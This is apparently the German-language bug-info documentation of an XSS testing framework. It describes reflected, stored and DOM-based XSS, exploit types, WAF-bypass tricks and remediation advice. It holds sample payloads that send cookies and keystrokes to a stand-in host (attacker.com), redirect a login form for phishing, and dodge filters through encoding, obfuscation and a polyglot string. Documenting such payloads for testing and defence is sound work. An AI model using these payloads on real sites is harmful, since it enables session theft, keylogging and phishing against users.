# BUGINFO.md - XSS Hunter Pro Framework

Dieses Dokument enthält Informationen zu bekannten Schwachstellen und deren Kategorisierung im XSS Hunter Pro Framework.

## Cross-Site Scripting (XSS) Schwachstellen

### Typen von XSS-Schwachstellen

#### 1. Reflected XSS

**Beschreibung:** Bei Reflected XSS wird der bösartige Code vom Webserver zurück an den Browser des Opfers gesendet, typischerweise als Teil einer Suchanfrage oder eines Formulars.

**Schweregrad:** Hoch

**Erkennungsmerkmale:**
- Der Payload wird in der URL oder in POST-Parametern gesendet
- Die Antwort des Servers enthält den Payload
- Die Ausführung erfolgt sofort nach dem Laden der Seite

**Beispiel-Payload:**
```
<script>alert(document.cookie)</script>
```

#### 2. Stored XSS

**Beschreibung:** Bei Stored XSS wird der bösartige Code dauerhaft auf dem Zielserver gespeichert (z.B. in einer Datenbank) und später an andere Benutzer ausgeliefert.

**Schweregrad:** Kritisch

**Erkennungsmerkmale:**
- Der Payload wird in der Datenbank oder anderen persistenten Speichern gespeichert
- Die Ausführung erfolgt, wenn andere Benutzer die betroffene Seite besuchen
- Der Angriff kann viele Benutzer betreffen

**Beispiel-Payload:**
```
<img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

#### 3. DOM-based XSS

**Beschreibung:** Bei DOM-based XSS wird der bösartige Code durch Manipulation des Document Object Model (DOM) im Browser ausgeführt, ohne dass der Server den Payload verarbeitet.

**Schweregrad:** Mittel bis Hoch

**Erkennungsmerkmale:**
- Der Payload wird nicht vom Server verarbeitet
- Die Ausführung erfolgt durch clientseitigen JavaScript-Code
- Häufig in Single-Page-Anwendungen (SPAs) zu finden

**Beispiel-Payload:**
```
<script>document.getElementById("demo").innerHTML = location.hash.substring(1);</script>
```

### Exploit-Typen

#### 1. Datendiebstahl (data_theft)

**Beschreibung:** Stiehlt sensible Daten wie Cookies, Authentifizierungstoken oder persönliche Informationen.

**Beispiel-Payload:**
```
<script>
fetch('https://attacker.com/steal?data='+encodeURIComponent(document.cookie))
</script>
```

#### 2. Keylogger (keylogger)

**Beschreibung:** Zeichnet Tastatureingaben des Benutzers auf, um Passwörter oder andere sensible Informationen zu stehlen.

**Beispiel-Payload:**
```
<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/log?key='+e.key)
});
</script>
```

#### 3. DOM-Manipulation (dom_manipulation)

**Beschreibung:** Verändert das Erscheinungsbild oder Verhalten der Webseite, um Benutzer zu täuschen oder Phishing-Angriffe durchzuführen.

**Beispiel-Payload:**
```
<script>
document.querySelector('form').action = 'https://attacker.com/fake_login';
</script>
```

#### 4. Cookie-Diebstahl (cookie_stealing)

**Beschreibung:** Spezialisierte Form des Datendiebstahls, die sich auf das Stehlen von Cookies konzentriert.

**Beispiel-Payload:**
```
<img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

## WAF-Bypass-Techniken

Das Framework unterstützt verschiedene Techniken, um Web Application Firewalls (WAFs) zu umgehen:

### 1. Encoding-Variationen

**Beschreibung:** Verwendet verschiedene Formen der Kodierung, um Erkennungsmuster zu umgehen.

**Beispiele:**
- HTML-Entitäten: `&lt;script&gt;alert(1)&lt;/script&gt;`
- Unicode-Kodierung: `\u003Cscript\u003Ealert(1)\u003C/script\u003E`
- URL-Kodierung: `%3Cscript%3Ealert%281%29%3C%2Fscript%3E`

### 2. Obfuskation

**Beschreibung:** Verschleiert den Code, um die Erkennung zu erschweren.

**Beispiele:**
- JavaScript-Obfuskation: `eval(String.fromCharCode(97,108,101,114,116,40,49,41))`
- Aufteilen von Strings: `<script>a="al";b="ert";c="(1)";eval(a+b+c)</script>`

### 3. Polyglot-Payloads

**Beschreibung:** Payloads, die in mehreren Kontexten funktionieren.

**Beispiel:**
```
javascript:"/*\"/*--><script>alert(1);</script>"
```

### 4. Nicht-standardmäßige Tags und Attribute

**Beschreibung:** Verwendet ungewöhnliche Tags oder Attribute, die von WAFs möglicherweise nicht erkannt werden.

**Beispiele:**
- `<svg onload=alert(1)>`
- `<details ontoggle=alert(1)>`

## ML-basierte Payload-Optimierung

Das Framework verwendet maschinelles Lernen, um Payloads zu optimieren:

1. **Kontextanalyse:** Erkennt den Kontext, in dem der Payload eingefügt wird (HTML, JavaScript, Attribute, etc.)
2. **Musterlernen:** Lernt aus erfolgreichen und fehlgeschlagenen Payloads
3. **Payload-Generierung:** Generiert neue Payloads basierend auf gelernten Mustern
4. **Feedback-Schleife:** Verbessert die Generierung durch Feedback aus Testläufen

## Schwachstellenkategorisierung

Das Framework kategorisiert Schwachstellen nach:

1. **Typ:** Reflected XSS, Stored XSS, DOM-based XSS
2. **Schweregrad:** Niedrig, Mittel, Hoch, Kritisch
3. **Auswirkung:** Datendiebstahl, Kontomanipulation, Sitzungsübernahme, etc.
4. **Ausnutzbarkeit:** Einfach, Mittel, Schwierig
5. **CVSS-Score:** Numerische Bewertung basierend auf dem Common Vulnerability Scoring System

## Empfehlungen zur Behebung

Für jede identifizierte Schwachstelle bietet das Framework spezifische Empfehlungen zur Behebung:

1. **Input-Validierung:** Überprüfung und Bereinigung von Benutzereingaben
2. **Output-Encoding:** Kontextspezifisches Encoding von Ausgaben
3. **Content Security Policy (CSP):** Implementierung einer strengen CSP
4. **X-XSS-Protection-Header:** Aktivierung des XSS-Filters im Browser
5. **HttpOnly- und Secure-Flags:** Schutz von Cookies vor XSS-Angriffen
6. **Frameworks und Bibliotheken:** Verwendung von sicheren Frameworks, die automatisch XSS-Schutz bieten
